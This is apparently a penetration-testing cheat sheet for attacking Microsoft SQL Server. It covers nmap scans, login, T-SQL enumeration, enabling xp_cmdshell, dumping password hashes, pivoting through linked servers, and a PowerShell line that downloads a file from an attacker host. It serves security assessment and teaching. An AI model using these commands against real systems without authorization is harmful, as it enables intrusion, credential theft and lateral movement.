## Overview

Microsoft SQL Server (MSSQL) is a relational database management system commonly used in enterprise environments.

From an attacker perspective, MSSQL can provide:

- credential exposure
- sensitive data
- OS command execution
- lateral movement opportunities
- privilege escalation paths
- domain compromise opportunities

MSSQL often runs on:

```
TCP 1433
```

It may also appear on dynamic ports depending on configuration.

---

# MSSQL Architecture Basics

MSSQL uses the **SQL Server Database Engine**, which communicates using **T-SQL (Transact-SQL)**.

Database servers may be:

- standalone
- domain joined
- linked to other database servers
- integrated with Active Directory

This makes MSSQL highly valuable during internal pentests.

# Service Detection

## Nmap MSSQL Scan

Basic detection:

```bash
nmap -p 1433 -sV {target}
```

Service scripts:

```bash
sudo nmap -sV -p 1433 \
--script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,\
ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,\
ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes \
{target IP}
```

These scripts can reveal:

- SQL Server version
- authentication methods
- accessible databases
- whether xp_cmdshell is enabled
- NTLM information
- potential credentials

# Authentication Methods

MSSQL supports two main authentication types:

### Windows Authentication

Uses Active Directory credentials.

Example:

```bash
python3 mssqlclient.py Administrator@{target} -windows-auth
```

Useful during:

- internal assessments
- domain footholds
- relay attacks
- pass-the-hash attacks

---

### SQL Authentication

Uses database-specific credentials.

Example:

```bash
python3 mssqlclient.py sa:{password}@{target}
```

Default administrative user:

```
sa
```

Misconfigured servers may allow:

- empty password
- weak password
- password reuse

# Enumeration via T-SQL

Once authenticated, enumeration focuses on:

- databases
- users
- privileges
- configuration
- linked servers
- command execution capability

---

## Identify Current Context

Current user:

```sql
SELECT SYSTEM_USER;
```

Current database:

```sql
SELECT DB_NAME();
```

Current SQL login:

```sql
SELECT SUSER_NAME();
```

---

## Enumerate Databases

```sql
SELECT name FROM master..sysdatabases;
```

or:

```sql
SELECT name FROM sys.databases;
```

---

## Enumerate Tables

```sql
SELECT * FROM information_schema.tables;
```

---

## Enumerate Columns

```sql
SELECT column_name
FROM information_schema.columns
WHERE table_name='table_name';
```

Useful for identifying:

- credentials
- API keys
- tokens
- PII

---

## Enumerate SQL Logins

```sql
SELECT name, create_date, modify_date
FROM sys.sql_logins;
```

---

# Privilege Enumeration

Determine privilege level:

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
```

If result:

```
1
```

User has full administrative rights.

---

Identify current SQL user:

```sql
SELECT USER_NAME();
SELECT SYSTEM_USER;
```

# Command Execution

MSSQL can execute operating system commands via:

```
xp_cmdshell
```

This is a key post-exploitation feature.

---

## Enable Advanced Options

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
```

---

## Enable xp_cmdshell

```sql
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

---

## Execute OS Commands

```sql
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'hostname';
EXEC xp_cmdshell 'ipconfig';
```

---

# File Transfer via PowerShell

Example download payload:

```sql
EXEC xp_cmdshell 'powershell -command "Invoke-WebRequest http://<attacker_ip>/file.exe -OutFile C:\temp\file.exe"';
```

This can allow:

- staging payloads
- downloading tools
- establishing persistence

---

# Credential & Hash Extraction

Dump SQL password hashes:

```sql
SELECT name,password_hash
FROM sys.sql_logins;
```

Hashes often stored as:

```
SHA1
```

Cracking tools:

- hashcat
- john

# Linked Servers

Linked servers allow communication between MSSQL instances.

They may allow lateral movement.

---

## Enumerate Linked Servers

```sql
EXEC sp_linkedservers;
```

---

## Execute Command on Linked Server

```sql
EXEC ('EXEC xp_cmdshell ''whoami''') AT <linked_server>;
```

Potential pivot opportunity.

# Common Misconfigurations

Pentesters should check for:

### Weak authentication

- empty SA password
- weak SQL credentials
- reused domain credentials

---

### Excessive privileges

- user is sysadmin
- database marked TRUSTWORTHY
- excessive role permissions

---

### Dangerous features enabled

- xp_cmdshell enabled
- CLR integration enabled
- Ole Automation enabled

---

### Lateral movement opportunities

- linked servers configured
- domain-integrated SQL servers
- stored credentials inside databases

1. identify MSSQL service
2. enumerate version
3. test authentication
4. connect to database
5. enumerate users and databases
6. identify privileges
7. test xp_cmdshell
8. search for credentials
9. identify linked servers
10. pivot or escalate privileges

# Key Takeaways

- MSSQL is often highly valuable in enterprise environments
- xp_cmdshell can provide direct OS command execution
- linked servers can allow lateral movement
- SQL servers frequently store sensitive credentials
- Windows authentication can allow domain-level compromise
- enumeration of roles and privileges is critical
